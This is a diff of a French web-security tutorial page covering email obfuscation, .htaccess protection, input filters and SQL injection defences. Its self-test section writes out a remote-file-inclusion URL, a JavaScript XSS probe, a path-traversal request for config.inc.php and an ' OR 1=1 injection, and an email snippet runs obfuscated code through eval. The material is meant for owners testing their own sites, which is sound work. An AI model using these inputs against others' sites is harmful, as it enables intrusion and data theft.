+						<a id="cryptmail"></a><hr><br>
 						<header>
 							<h2>Cryptez votre adresse e-mail</h2>
 						</header>
 						<p>Si vous n'avez pas d'autre choix que d'afficher une adresse e-mail sur votre site web, vous avez 2 solutions:</p>
 						<p><strong>1-</strong> Créez un fichier image (svg, png, jpeg) avec votre adresse écrite dessus. Ce n'est pas du texte, les robots spammeurs ne le verront pas.</p>
 						<p><strong>2-</strong> Cryptez votre adresse e-mail avec du javascript. J'utilise cette méthode depuis des années et jamais ces adresses n'ont été spammées. Allez sur ce site web <a href="http://www.jottings.com/obfuscator/">www.jottings.com/obfuscator/</a> ou <a href="https://jumk.de/nospam/stopspam.html">jumk.de/nospam/</a> pour faire crypter votre adresse.<br>
-Pour aller encore plus loin, au lieu d'intégrer ce code à votre page html, on va l'appeler depuis un fichier javascript. L'avantage est que si l'adresse est présente sur plusieurs pages, vous n'avez à faire la modification qu'une fois.<br>
-Créez un dossier qu'on appelle “js” et on va y mettre un fichier qu'on va appeler “adresse.js”. Copiez dans ce fichier la ligne de code javascript de votre adresse e-mail cryptée qui commence par “var …”. Par exemple:</p>
+						Pour aller encore plus loin, au lieu d'intégrer ce code à votre page html, on va l'appeler depuis un fichier javascript. L'avantage est que si l'adresse est présente sur plusieurs pages, vous n'avez à faire la modification qu'une fois.<br>
+						Créez un dossier qu'on appelle “js” et on va y mettre un fichier qu'on va appeler “adresse.js”. Copiez dans ce fichier la ligne de code javascript de votre adresse e-mail cryptée qui commence par “var …”. Par exemple:</p>
 <span class="smallfont">Code&nbsp;:</span>
 <pre class="smallfont code">var g6=&quot;&quot;;for(var z1=0;z1&lt;335;z1++)g6+=String.fromCharCode((&quot;{fw%}&lt;B\'m3xnmya\'Bwj {tjxztrst%a\'a\'B kjwm%fA,0.a\'a\'1l4 4-jhfqujw3,?tyqnfr,aaBkjw ,ViqyVj755zaajsVnfrtistr5955zaantr,ztjxztrst%Sa\',aa,0.a\'a\'1l4V4-jhfqujw3str@5955}(+ntrCa\',aa,aaBkjwm3xnmya\'By4-jhfqujw3,Cf4AiqyS@j7}(+jsnfrSti.b5`ba\'a\'`1l4S\'@z5B\'\'@ktw-{fw%u&lt;B5@u&lt;A}&lt;3qjslym@u&lt;0B88.z50B}&lt;3xzgxyw-u&lt;188.3xuqny-\'\'.3wj{jwxj-.3otns-\'\'.@j{fq-z5.&quot;.charCodeAt(z1)-(-59+64)+24+39)%(5*2+85)+-45+77);document.write(eval(g6))</pre>
 <p>Ensuite, dans votre page html, copiez le code suivant&nbsp;:</p>
 <span class="smallfont">Code HTML:</span>
 <pre class="smallfont code"><span style="color:#800000">&lt;script src=<span style="color:#0000FF">&quot;js/adresse.js&quot;</span> type=<span style="color:#0000FF">&quot;text/javascript&quot;</span>&gt;</span><span style="color:#800000">&lt;/script&gt;</span></pre>
-<a id="adressmail"></a><hr><br>
+						<a id="adressmail"></a><hr><br>
 						<header>
 							<h2>Adresses e-mails à éviter</h2>
 						</header>
 						<p>Plus en rapport avec le spam qu'avec le piratage, les adresses e-mails qui ont les préfixes les plus courants sont spammées automatiquement (car ils ont plus de chances d'exister). Donc, évitez de créer des adresses avec les noms suivants&nbsp;:<br>
-webmaster@ admin@ contact@ email@ mail@ info@ sales@ support@ root@ www@ abuse@ news@</p>
+						webmaster@ admin@ contact@ email@ mail@ info@ sales@ support@ root@ www@ abuse@ news@</p>
 						<p>J'utilisais contact@ et info@ sans jamais les diffuser sur le web, mais le nombre de spams devenaient insupportables. Bref, pour le spam comme pour le piratage, il faut éviter la fainéantise intellectuelle et les paramètres par défaut.</p>
-<a id="dossierpasse"></a><hr><br>
+						<a id="dossierpasse"></a><hr><br>
 						<header>
 							<h2>Protéger un dossier avec un mot de passe</h2>
 						</header>
@@ -1025,20 +1026,20 @@ webmaster@ admin@ contact@ email@ mail@ info@ sales@ support@ root@ www@ abuse@ 
 </pre></div>
 						<p><strong>Bloquer encore mieux le répertoire “administration”&nbsp;:</strong><br>
 						Enfin, le tableau de bord ou l'interface d'administration de votre blog, CMS ou e-commerce dispose déjà d'une protection par identifiant et mot de passe. Seulement, cette défense est dépendante de la technique employée par le programmeur et elle peut souffrir d'une faille de sécurité. <strong>Ajouter, en plus, un deuxième système de mot de passe avec le fichier “.htaccess” renforce considérablement la protection pour accéder au tableau de bord ou l'interface d'administration.</strong> Cette double authentification n'est pas gênante puisque les logiciels navigateurs web enregistrent ces mots de passe. Ne vous en privez pas. Bien sûr, vous utiliserez des mots de passe différents et complexes pour les deux méthodes&nbsp;! Seule l'agression par force brute peut venir à bout du mot de passe “.htaccess”, alors, autant le rendre long et compliqué. Et normalement, votre hébergeur s'apercevra de ce comportement suspect et bloquera l'attaquant à temps.</p>
-<a id="robots"></a><hr><br>
+						<a id="robots"></a><hr><br>
 						<header>
 							<h2>Le fichier robots.txt</h2>
 						</header>
 						<p>Vous connaissez le rôle du fichier robots.txt&nbsp;? <a href="http://www.robotstxt.org/">http://www.robotstxt.org</a> On utilise ce fichier pour interdire à un moteur de recherche d'indexer un dossier ou un fichier.</p>
 						<p>Mais ne déclarez pas dans ce fichier robots.txt un répertoire ou un fichier qui doit rester secret non seulement des moteurs de recherche mais aussi des pirates&nbsp;!!! Tout le monde peut lire le contenu du fichier robots.txt et donc trouver l'adresse de votre dossier/fichier secret.</p>
 						<p>Pour garder un dossier à l'abri des regards des robots indexeurs et des pirates, il est plus efficace de le protéger avec un mot de passe htaccess (voir ci-dessus).</p>
-<a id="protcss"></a><hr><br>
+						<a id="protcss"></a><hr><br>
 						<header>
 							<h2>Protéger vos fichiers style.css et index.php</h2>
 						</header>
 						<p>Protégez par FTP vos fichiers “style.css” et “index.php” avec les droits 404 ou 444. J'ai vu un cas de piratage du fichier style.css où le pirate avait modifié ce fichier pour afficher un pop-up.<br>
-Protégez aussi par FTP le fichier “index.php” avec les droits 404 ou 444, car c'est par lui que passent toutes les commandes de votre CMS, blog ou e-commerce.</p>
-<a id="testweb"></a><hr><br>
+						Protégez aussi par FTP le fichier “index.php” avec les droits 404 ou 444, car c'est par lui que passent toutes les commandes de votre CMS, blog ou e-commerce.</p>
+						<a id="testweb"></a><hr><br>
 						<header>
 							<h2>Comment tester la sécurité de mon site web&nbsp;?</h2>
 						</header>
@@ -1047,7 +1048,7 @@ Protégez aussi par FTP le fichier “index.php” avec les droits 404 ou 444, c
 						<p><strong class="vert">REMARQUE 1&nbsp;:</strong> <strong>aucun de ces exemples ne vous apprendra à pirater un site.</strong> Il en faut bien plus et c'est plus compliqué que ça. Cependant, vous saurez si votre script est mal codé ou non.</p>
 						<p><strong class="vert">REMARQUE 2&nbsp;:</strong> Désactivez les règles de filtrages du fichier .htaccess proposées <a href="#htaccess">ci-dessus.</a> En effet, ces règles vont stopper la plupart des attaques présentées ci-dessous en vous envoyant une erreur <em>“403 Forbidden”</em>. Donc, pour savoir si votre script est faillible, désactivez ces règles et s'il y a une faille, corrigez le script ou installez-en un autre mieux sécurisé.</p>
 						<p><strong>1- Attaque par exécution d'un script externe&nbsp;:</strong><br>
-Créez un fichier texte contenant le code suivant:</p>
+						Créez un fichier texte contenant le code suivant:</p>
 <span class="smallfont">Code PHP&nbsp;:</span>
 <!-- HTML generated using hilite.me --><div class="smallfont code" style="overflow:auto;width:auto;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #BC7A00">&lt;?php</span>
 <span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&quot;Hackeur vaillant, rien d&#39;impossible !!!&quot;</span>;
@@ -1066,8 +1067,8 @@ Créez un fichier texte contenant le code suivant:</p>
 <span class="smallfont">Code&nbsp;:</span>
 <pre class="smallfont code">http://www.votredomaine.tld/?page=http://www.autresiteweb.tld/pirate.txt?</pre>
 						<p><strong>2- Attaque par XSS ou Cross Site Scripting&nbsp;:</strong><br>
-On utilise le javascript pour prendre le contrôle de votre CMS, blog ou e-commerce.<br>
-Vos URLs ressemblent à ça (à adapter à votre cas)&nbsp;:</p>
+						On utilise le javascript pour prendre le contrôle de votre CMS, blog ou e-commerce.<br>
+						Vos URLs ressemblent à ça (à adapter à votre cas)&nbsp;:</p>
 <span class="smallfont">Code&nbsp;:</span>
 <pre class="smallfont code">http://www.votredomaine.tld/?page=123</pre>
 						<p>On remplace “123” par du javascript. S'il n'est pas filtré, alors c'est piraté. Par exemple&nbsp;:</p>
@@ -1078,9 +1079,9 @@ Vos URLs ressemblent à ça (à adapter à votre cas)&nbsp;:</p>
 <pre class="smallfont code">http://www.votredomaine.tld/?page=javascript:alert(%22Hackeur vaillant, rien d'impossible&nbsp;!!!%22)</pre>
 						<p>Si une fenêtre d'alerte javascript apparait avec le texte <em>“Hackeur vaillant, rien d'impossible&nbsp;!!!”</em>, votre site est ouvert à ce genre d'attaque.</p>
 						<p><strong>3- Faille dans le téléchargement et le téléversement de fichiers&nbsp;:</strong><br>
-Cela s'applique à 2 cas&nbsp;:</p>
+						Cela s'applique à 2 cas&nbsp;:</p>
 						<p>a) Vous avez un script de téléchargement qui propose à vos visiteurs de prendre des fichiers. Vous avez mis tous les fichiers à télécharger dans un dossier de votre hébergement, par exemple /home/loginftp/www/download/ .<br>
-Votre URL ressemble à ça (à adapter à votre cas)&nbsp;:</p>
+						Votre URL ressemble à ça (à adapter à votre cas)&nbsp;:</p>
 <span class="smallfont">Code&nbsp;:</span>
 <pre class="smallfont code">http://www.votredomaine.tld/download.php?fichier=monfichier.pdf</pre>
 						<p>Si on modifie “monfichier.pdf” qui se trouve dans le dossier “/home/loginftp/www/download/” par “../config.inc.php” qui se trouve ici “/home/loginftp/www/” comme cela&nbsp;:</p>
@@ -1101,8 +1102,8 @@ Votre URL ressemble à ça (à adapter à votre cas)&nbsp;:</p>
 <span class="smallfont">Code&nbsp;:</span>
 <pre class="smallfont code">http://www.votredomaine.tld/?page=http://www.autresite.tld</pre>
 						<p><em>À cœur vaillant, rien d'impossible</em> est la devise de Jacques Coeur qui vécut au XVe s.<br>
-<em>Comme je regrette le temps des pages statiques en html&nbsp;!</em> est ma devise. &#x1f609;</p>
-<a id="filtrephp"></a><hr><br>
+						<em>Comme je regrette le temps des pages statiques en html&nbsp;!</em> est ma devise. &#x1f609;</p>
+						<a id="filtrephp"></a><hr><br>
 						<header>
 							<h2>Sécuriser un script PHP</h2>
 						</header>
@@ -1117,7 +1118,7 @@ Votre URL ressemble à ça (à adapter à votre cas)&nbsp;:</p>
 }
 </pre></div>
 						<p>Ainsi ne sont autorisés que les caractères alphanumériques et les signes _ . &amp; =<br>
-Tous les autres caractères sont effacés.</p>
+						Tous les autres caractères sont effacés.</p>
 						<p>Il existe un autre filtre si celui présenté ci-dessus est trop restrictif&nbsp;:</p>
 <span class="smallfont">Code PHP&nbsp;:</span>
 <!-- HTML generated using hilite.me --><div class="smallfont code" style="overflow:auto;width:auto;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #008000; font-weight: bold">foreach</span> (<span style="color: #19177C">$_REQUEST</span> <span style="color: #008000; font-weight: bold">as</span> <span style="color: #19177C">$key</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$val</span>) 
@@ -1135,9 +1136,9 @@ Tous les autres caractères sont effacés.</p>
 <span style="color: #19177C">$variable</span> <span style="color: #666666">=</span> <span style="color: #008000">preg_replace</span>(<span style="color: #BA2121">&quot;/[^_A-Za-z0-9-\.&amp;=]/i&quot;</span>,<span style="color: #BA2121">&#39;&#39;</span>, <span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&quot;variable&quot;</span>]);
 </pre></div>
 						<p>Ceci est une protection générale qui fonctionne contre les formes les plus simples de piratage.<br>
-Ne mettez ce code que seulement s'il n'y a aucun système de filtrage.</p>
+						Ne mettez ce code que seulement s'il n'y a aucun système de filtrage.</p>
 						<p>À partir de PHP 5.2, il existe une série de filtres qui permet de bien cibler le filtrage des données&nbsp;: <a href="https://www.php.net/filter">https://www.php.net/filter</a>.</p>
-<a id="filtreperl"></a><hr><br>
+						<a id="filtreperl"></a><hr><br>
 						<header>
 							<h2>Sécuriser un script PERL</h2>
 						</header>
@@ -1150,9 +1151,9 @@ Ne mettez ce code que seulement s'il n'y a aucun système de filtrage.</p>
 <span style="color: #19177C">$val</span> <span style="color: #666666">=~</span> <span style="color: #BB6688">s/([&lt;&gt;\&amp;\$;:\`\|\&quot;\&#39;*\?\!\~\^\(\)\[\]\{\}]|\\|\.\.|^\/)//g</span>;
 </pre></div>
 						<p>D'abord, on décode les caractères non alphanumériques qui sont encodés en url-encoded. Puis, on efface les caractères qui peuvent poser des problèmes comme des balises html et certains signes à la 4e ligne du code ci-dessus.<br>
-Ceci est une protection générale qui fonctionne contre les formes les plus simples de piratage.</p>
+						Ceci est une protection générale qui fonctionne contre les formes les plus simples de piratage.</p>
 						<p>Ne mettez ce code que seulement s'il n'y a aucun système de filtrage.</p>
-<a id="injectsql"></a><hr><br>
+						<a id="injectsql"></a><hr><br>
 						<header>
 							<h2>Contrer les injections SQL</h2>
 						</header>
@@ -1173,14 +1174,14 @@ Ceci est une protection générale qui fonctionne contre les formes les plus sim
 						<p>Et elle permettrait certainement d'identifier l'utilisateur avec succès, car la requête est vraie si un utilisateur '' existe OU si 1=1. Comme l'utilisateur <em>vide</em> n'existe pas, mais que 1 est égal à 1, alors la requête est vraie et valide. Donc, en ajoutant ce code, on force à croire que n'importe quelle requête est vraie. Le signe “//” signifiant un commentaire en PHP, le reste du code n'est pas interprété, il est rendu inutile. Et vous voilà avec un accès à la base de données&nbsp;! Ceci est l'exemple le plus simple, il en existe bien d'autres qui permettent de véritablement prendre le contrôle d'un serveur en se faisant passer pour root ou l'administrateur. Les possibilités sont malheureusement nombreuses. Nous ne les développerons pas.</p>
 						<p><strong>Comment se protéger des attaques par injection SQL&nbsp;?</strong></p>
 						<p>Pour prévenir ces attaques, il faut connaitre la programmation. Si celle-ci est bien réalisée, les attaques ne sont plus possibles. Voici quelques conseils&nbsp;:<br>
-Évitez d'utiliser un compte ayant tous les pouvoirs pour l'exécution de votre serveur SQL.<br>
-Supprimez les fonctions que vous n'utilisez pas telle que&nbsp;: master..xp_cmdshell, et de manière générale toutes celles commençant par “master..xp”.<br>
-Vérifiez les entrées utilisateurs telles que les champs de texte. Vérifiez aussi que les nombres attendus soient bien des nombres avec une fonction telle que IsNumeric() par exemple.<br>
-Vérifiez aussi à bien filtrer les paramètres des URL qui sont ajoutables manuellement.<br>
-Utilisez les caractères et fonctions d'échappement tels que AddStripSlashes() en PHP, voyez les caractéristiques de la fonction et, en général, les documentations de vos langages de programmation pour plus d'informations. Cela empêchera l'entrée utilisateur du caractère ' en l'échappant à l'aide d'un slash le précédant.<br>
-Empêchez d'une manière générale certaines séquences d'entrées utilisateurs telles que “;”, “insert”, “select”, “//”, “--”, etc.<br>
-Limitez le nombre de caractères qu'un utilisateur peut entrer dans un champ de texte, car ceci peut fort bien lui compliquer la tâche.<br>
-Attention à ce que vous mettez dans les cookies, car un mot de passe (même crypté en md5) est vite trouvé par une attaque de ce type. Par la suite, un remplacement de cette valeur dans le cookie évite à l'attaquant une attaque de type force brute&nbsp;; c'est donc un joli cadeau.</p>
+						Évitez d'utiliser un compte ayant tous les pouvoirs pour l'exécution de votre serveur SQL.<br>
+						Supprimez les fonctions que vous n'utilisez pas telle que&nbsp;: master..xp_cmdshell, et de manière générale toutes celles commençant par “master..xp”.<br>
+						Vérifiez les entrées utilisateurs telles que les champs de texte. Vérifiez aussi que les nombres attendus soient bien des nombres avec une fonction telle que IsNumeric() par exemple.<br>
+						Vérifiez aussi à bien filtrer les paramètres des URL qui sont ajoutables manuellement.<br>
+						Utilisez les caractères et fonctions d'échappement tels que AddStripSlashes() en PHP, voyez les caractéristiques de la fonction et, en général, les documentations de vos langages de programmation pour plus d'informations. Cela empêchera l'entrée utilisateur du caractère ' en l'échappant à l'aide d'un slash le précédant.<br>
+						Empêchez d'une manière générale certaines séquences d'entrées utilisateurs telles que “;”, “insert”, “select”, “//”, “--”, etc.<br>
+						Limitez le nombre de caractères qu'un utilisateur peut entrer dans un champ de texte, car ceci peut fort bien lui compliquer la tâche.<br>
+						Attention à ce que vous mettez dans les cookies, car un mot de passe (même crypté en md5) est vite trouvé par une attaque de ce type. Par la suite, un remplacement de cette valeur dans le cookie évite à l'attaquant une attaque de type force brute&nbsp;; c'est donc un joli cadeau.</p>
 						<p><strong>Application concrète</strong></p>
 						<p>La méthode la plus simple est de filtrer toutes les variables en appliquant les filtres php comme ceci&nbsp;:</p>
 <span class="smallfont">Code PHP&nbsp;:</span>
@@ -1225,18 +1226,18 @@ Attention à ce que vous mettez dans les cookies, car un mot de passe (même cry
 <span style="color: #19177C">$pseudo</span> <span style="color: #666666">=</span> <span style="color: #19177C">$login</span>[<span style="color: #BA2121">&#39;user&#39;</span>]; <span style="color: #408080; font-style: italic">// on recupère le pseudo</span>
 <span style="color: #BC7A00">?&gt;</span> 
 </pre></div>
-<a id="piratesavoir"></a><hr><br>
+						<a id="piratesavoir"></a><hr><br>
 						<header>
 							<h2>Avez-vous été piraté sans le savoir&nbsp;?</h2>
 						</header>
 						<p>Vous avez un CMS, blog ou e-commerce&nbsp;? Vous avez peut-être été piraté sans le savoir par des pirates qui veulent mettre des liens vers leurs sites web afin d'augmenter artificiellement leur Pagerank.<br>
-Attention, c'est très sérieux. C'est un piratage invisible, presque bénin, mais bien réel. Si vous trouvez les éléments décrits ci-dessous, votre CMS, blog ou e-commerce a été piraté par des professionnels payés pour cela, non par des gamins qui s'amusent à effacer des sites en mettant leurs pseudos à la place. <br>
-Connectez-vous à votre phpMyadmin.<br>
-Une fois identifié, dans la colonne de gauche en haut, cliquez sur le nom de votre base, puis dans la fenêtre principale, en haut cliquez sur l'onglet Recherche.<br>
-Puis entrez l'une des 3 phrases: <br>
-%display:none%<br>
-%height:0%<br>
-%visibility:hidden%</p>
+						Attention, c'est très sérieux. C'est un piratage invisible, presque bénin, mais bien réel. Si vous trouvez les éléments décrits ci-dessous, votre CMS, blog ou e-commerce a été piraté par des professionnels payés pour cela, non par des gamins qui s'amusent à effacer des sites en mettant leurs pseudos à la place. <br>
+						Connectez-vous à votre phpMyadmin.<br>
+						Une fois identifié, dans la colonne de gauche en haut, cliquez sur le nom de votre base, puis dans la fenêtre principale, en haut cliquez sur l'onglet Recherche.<br>
+						Puis entrez l'une des 3 phrases: <br>
+						%display:none%<br>
+						%height:0%<br>
+						%visibility:hidden%</p>
 						<p>Si vous trouvez des entrées dans les textes de vos pages ou les commentaires contenant “display:none” ou “height:0” ou “visibility:hidden”, alors vous avez été piraté. Ces liens web vers les sites des pirates sont invisibles mais bien présents dans le code et visibles par les robots indexeurs. Effacez ces liens, changez vos mots de passe, mettez à jour votre logiciel et suivez les conseils dans cet article.</p>
 						<p>Et si vous constatez un comportement bizarre de votre CMS, blog ou e-commerce, profitez-en pour vérifier qu'il n'y a pas de nouveaux fichiers ou dossiers ajoutés ou modifiés récemment en installant <a href="#fichmodif">le script décrit ici-même.</a> C'est peut-être votre CMS, blog ou e-commerce qui a fait cela, mais il vaut mieux en être sûr.</p>
 					</section>
